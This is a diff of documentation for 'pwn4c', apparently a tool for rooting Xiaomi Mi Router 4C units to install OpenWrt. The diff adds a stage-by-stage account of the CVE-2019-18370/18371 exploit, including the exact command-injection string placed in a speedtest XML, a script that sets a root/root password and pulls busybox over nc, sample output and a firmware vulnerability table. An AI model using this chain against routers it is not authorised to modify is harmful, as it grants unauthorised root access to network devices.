@@ -17,7 +17,12 @@ This is the simplest method. The Go client exploits a known command injection vu
 
 ### Requirements
 
-- The router must be running **stock Xiaomi firmware** that is vulnerable to CVE-2019-18370/18371. Most firmware versions shipped before mid-2020 are vulnerable.
+- The router must be running **stock Xiaomi firmware** vulnerable to CVE-2019-18370/18371. Field-tested on R4CM (Mi Router 4C):
+  | Firmware | Result |
+  |----------|--------|
+  | China `2.14.75`–`2.14.92` | Vulnerable (community-reported) |
+  | Global `3.0.23` | Vulnerable (**verified 2026-10-09**: gains root shell, ports 21/22/23 open) |
+  | China `2.14.502` (latest) | **Patched** — `c_upload` rejects every archive (`code 1629`, even for empty files). Downgrade first. |
 - The Host must be on the **same LAN segment** as the router. Connect via Ethernet to any LAN port, or join the router's default Wi-Fi network.
 
 ### A.1 Install the Go Client
@@ -57,34 +62,51 @@ Connect the Host to any LAN port on the stock Xiaomi router. The router's defaul
 pwn4c infect 192.168.31.1
 ```
 
-Expected output:
+You will be prompted for the router admin password. What `infect` does, stage by stage (Go port of [OpenWRTInvasion](https://github.com/acecilia/OpenWRTInvasion), CVE-2019-18370/18371):
+
+1. **Scrape + authenticate** — GETs `/cgi-bin/luci/web`, extracts `deviceId` (MAC) and `key`, derives the `nonce`/`sha1` login hash, and POSTs to `api/xqsystem/login` to obtain the session token (`stok`).
+2. **File server** — starts a local TCP server on a random port. When the router asks for `busybox-mipsel`, the Host fetches it from upstream GitHub and streams it back (requires Host internet access).
+3. **Build payload** — builds a `tar.gz` in memory containing:
+   - `speedtest_urls.xml`: a copy of the stock speedtest list, but the `class type="2"` URL is replaced with `http://<router-ip> -q -O /dev/null;((sh /tmp/script.sh exploit) &);exit;wget ...` — command injection executed when the router runs its speed test.
+   - `script.sh`: sets `root/root` password, pulls `busybox-mipsel` from the Host via `nc $REMOTE_ADDR $QUERY_STRING`, and starts `telnetd`.
+4. **Upload** — POSTs the tarball to `api/misystem/c_upload` as multipart `files={"image": ...}` with a `python-requests` User-Agent.
+5. **Trigger** — GETs `api/xqnetdetect/netspeed?<port>`. The router unpacks the archive to `/tmp`, runs the poisoned speed test, and the injected shell connects back to the Host file server (CGI vars `REMOTE_ADDR`/`QUERY_STRING` carry the Host IP/port).
+6. **Verify** — waits ~10s, then probes ports 23/22. Open = root shell ready (`root`/`root`).
+
+Expected output (success):
 
 ```
 [*] Target: 192.168.31.1
-[*] Extracting stok token via CVE-2019-18371...
-[+] Got stok: a1b2c3d4e5f6
-[*] Injecting payload via CVE-2019-18370...
-[+] Command injection successful. SSH enabled.
-[*] Connecting via SSH...
-[+] Connected as root.
-[*] Uploading pwn4c-firmware.bin to /tmp (2.8 MB)...
-[+] Upload complete.
-[*] Writing firmware: mtd write /tmp/pwn4c-firmware.bin OS1
-[+] Flash write complete.
-[*] Rebooting router...
-[*] Waiting for Drone to come online (timeout: 120s)...
-[+] Drone discovered!
-    Address:    192.168.4.1
-    Firmware:   pwn4c-0.1.0
-    Uptime:     12s
-[+] Infection complete. Drone is operational.
+[*] Enter router admin password:
+[*] 1. Scraping router metadata (MAC & Key)...
+[*] 2. Authenticating against router API...
+[+] Session Token (stok) acquired: <redacted-32-hex-chars>
+[*] 3. Detected Host PC Local IP: 192.168.31.74
+[*] 4. Local TCP Server listening on port 34803
+[*] 5. Building V8 Payload (Python-Requests Mimicry)...
+    -> payload size=1031 sha256=46aa0c92...
+[*] 6. Uploading tarball to router (Raw HTTP POST)...
+    -> Archive accepted successfully (code 0)!
+[*] 7. Triggering command injection...
+[*] Waiting 10 seconds for router to connect back...
+
+[+] Done! You can now run: telnet 192.168.31.1 (user: root, password: root)
+[+] Infection complete. Router is accessible via SSH.
 ```
 
-The entire process takes 60-90 seconds. The router reboots into the Pwn4C OpenWrt image and is immediately ready for use.
+> **Note on `code 1629`:** some firmware (e.g. Global `3.0.23`) answers the upload with `{"code":1629,"msg":"解压失败..."}` **and still extracts + executes the payload**. `infect` therefore treats a non-zero upload code as a warning, continues to the trigger stage, and lets the port check decide. Only if ports 23/22 stay closed is the run reported as failed (usually: patched firmware — see below). Details in [troubleshooting.md](troubleshooting.md#router-rejected-archive-code1629-解压失败可能文件已经损坏).
+
+> **Current scope:** `infect` ends with a verified **root shell** (telnet/SSH). Flashing the Pwn4C OpenWrt image (`mtd write`, reboot, discovery on `192.168.4.0/24`) is the next stage and is not automated yet.
 
 ### A.3 Post-Infection Network Setup
 
-After infection, the Drone operates on the `192.168.4.0/24` subnet (not the stock Xiaomi `192.168.31.0/24`). Reconnect the Host directly to any LAN port on the Drone. The Drone's built-in DHCP server assigns the Host an address automatically.
+Right after `infect`, the router still runs stock firmware on `192.168.31.0/24` — verify the shell first:
+
+```bash
+telnet 192.168.31.1   # user: root, password: root
+```
+
+Once the Pwn4C OpenWrt image is flashed (next stage), the Drone will operate on the `192.168.4.0/24` subnet instead. Reconnect the Host directly to any LAN port on the Drone. The Drone's built-in DHCP server assigns the Host an address automatically.
 
 If DHCP does not work, set a static IP:
 
@@ -99,10 +121,11 @@ sudo ip link set eth0 up
 
 | Failure | Cause | Solution |
 |---------|-------|----------|
-| `stok extraction failed` | Router firmware is patched against CVE-2019-18371 | Use Path B (manual TFTP or UART flash) |
-| `SSH connection refused` | Command injection succeeded but SSH did not start | Retry. If persistent, use Path B |
+| `unable to extract deviceId/key` | Router web page unreachable or changed layout | Check LAN link/IP; the router must serve `/cgi-bin/luci/web` |
+| `login rejected` | Wrong admin password | Re-enter the password set in the Xiaomi admin panel |
+| `upload code=1629` + ports closed | Patched firmware (e.g. China `2.14.502` rejects all archives) | Downgrade to a vulnerable build (`2.14.75`–`2.14.92`, Global `3.0.23`), or use Path B |
+| `telnet (23) and ssh (22) are both closed` | Injection did not execute (patched/slow target) | Retry once; try `telnet 192.168.31.1` manually; if persistent, use Path B |
 | `mtd write failed` | Insufficient `/tmp` space or flash write error | Reboot router to stock, retry. If persistent, use UART |
-| `Drone not discovered after reboot` | Firmware did not boot correctly | Connect via UART serial console and reflash (see Path B) |
 
 See [troubleshooting.md](troubleshooting.md#exploit-failures) for detailed diagnosis.
 
